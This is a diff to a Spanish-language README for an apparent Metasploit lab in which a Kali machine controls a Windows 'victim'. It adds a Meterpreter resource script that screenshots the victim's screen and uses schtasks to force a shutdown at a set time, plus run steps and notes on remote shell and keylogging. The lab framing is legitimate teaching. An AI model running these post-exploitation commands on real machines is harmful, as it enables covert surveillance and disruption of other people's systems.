@@ -90,12 +90,69 @@ Apertura de una shell interactiva de Windows (`cmd.exe`) controlada remotamente 
 meterpreter > shell
 ```
 
-**Resultado:** Se abre una sesión interactiva de `cmd.exe` en la máquina víctima, controlada completamente desde la terminal de Kali. Permite ejecutar cualquier comando de Windows de forma remota.
+**Resultado:** Se abre una sesión interactiva de `cmd.exe` en la máquina Windows víctima, controlada completamente desde la terminal de Kali. Permite ejecutar cualquier comando de Windows de forma remota.
 
 Para volver a Meterpreter desde la shell:
 ```bash
 C:\Windows\system32> exit
 ```
+
+---
+
+### Punto 4 — Ejecutar un script que tome captura y apague el equipo a hora programada
+
+Script que automatiza dos acciones desde Meterpreter: tomar una captura de pantalla como evidencia y luego apagar el equipo víctima a una hora específica usando el programador de tareas nativo de Windows (`schtasks`).
+
+**Enfoque utilizado:** La captura de pantalla se toma directamente desde Meterpreter, y el apagado se programa mediante `schtasks` ejecutado con `execute` para que persista aunque la sesión de Meterpreter se caiga.
+
+**Script `apagado_programado.rc` (ejecutado con `sessions -i <ID> -s apagado_programado.rc`):**
+
+```bash
+# 1. Captura de pantalla inicial como evidencia (se guarda en /home/kali/)
+screenshot
+
+# 2. Programar el apagado en Windows a la hora objetivo (formato HH:MM en 24h)
+#    Se usa execute -f para que el comando persista independiente de la sesión
+execute -f cmd.exe -a "/c schtasks /create /tn \"Apagado\" /tr \"shutdown /s /t 0\" /sc once /st 17:31 /f"
+
+# 3. Verificar que la tarea quedó creada correctamente
+execute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\" /fo LIST" -o
+
+# 4. Segunda captura de pantalla confirmando que la tarea está programada
+screenshot
+```
+
+**Pasos completos para ejecutar el script:**
+
+```bash
+# Paso 1: Crear el archivo del script en Kali (fuera de msfconsole)
+nano /home/kali/apagado_programado.rc
+# Pegar el contenido del script y guardar (Ctrl+O, Enter, Ctrl+X)
+
+# Paso 2: Verificar la sesión activa
+msf6 > sessions -l
+
+# Paso 3: Ejecutar el script sobre la sesión
+msf6 > sessions -i <ID> -s apagado_programado.rc
+
+# Paso 4: Verificar las capturas generadas después del apagado
+ls -lt /home/kali/*.jpeg | head -5
+```
+
+**Verificar la hora actual del Windows víctima antes de programar:**
+```bash
+meterpreter > shell
+C:\Windows\system32> time /t
+C:\Windows\system32> exit
+```
+
+**¿Por qué `schtasks` y no `sleep` de Meterpreter?**
+
+Durante el laboratorio se identificó que el comando `sleep` nativo de Meterpreter **pone en modo dormant al payload** y cierra la sesión activa, impidiendo que los comandos posteriores (segunda captura y shutdown) se ejecuten. La solución fue usar `schtasks` del propio Windows para programar el apagado de forma independiente a la sesión de Meterpreter, garantizando que el apagado ocurra incluso si la conexión cae.
+
+**Resultado:** Se tomó una captura de pantalla inicial guardada en `/home/kali/`, se programó el apagado del equipo víctima a la hora indicada mediante una tarea de Windows, y el equipo se apagó correctamente a la hora programada. La sesión de Meterpreter terminó automáticamente al perder conectividad con el Windows apagado.
+
+🎥 [Video apagado dispositivo víctima](https://github.com/user-attachments/assets/45ae6e70-b5d2-4cc7-8c34-a7fb60d2ca5f)
 
 ---
 
@@ -150,11 +207,3 @@ cat /home/kali/keylog_evidencia.txt
 |---------|-------------|
 | `lab_seguridad_kali.sh` | Script Bash para Kali — automatiza la configuración del exploit y los comandos Meterpreter de cada punto |
 | `lab_seguridad_windows.ps1` | Script PowerShell — equivalentes nativos en Windows de cada punto del laboratorio |
-
----
-
-## Video apagar dispositivo víctima
-
-> Últimos segundos por cuestión de tamaño del archivo.
-
-🎥 [Video apagado dispositivo víctima](https://github.com/user-attachments/assets/45ae6e70-b5d2-4cc7-8c34-a7fb60d2ca5f)
